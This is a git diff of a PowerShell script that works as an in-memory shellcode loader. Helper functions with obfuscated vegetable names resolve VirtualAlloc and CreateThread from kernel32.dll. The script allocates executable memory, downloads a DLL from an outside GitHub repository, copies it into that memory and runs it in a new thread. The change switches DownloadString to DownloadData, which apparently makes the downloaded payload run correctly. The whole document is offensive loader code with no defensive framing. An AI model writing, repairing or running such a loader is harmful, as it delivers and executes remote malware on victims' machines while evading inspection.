@@ -16,7 +16,9 @@ $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $f
 return $type.CreateType()
 }
 $cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
-[Byte[]] $buf = (New-Object Net.WebClient).DownloadString('https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/chxpo.dll')
+$webClient = New-Object System.Net.WebClient
+
+[Byte[]] $buf = $webClient.DownloadData('https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/chxpo.dll')
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
 $parsnips =
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
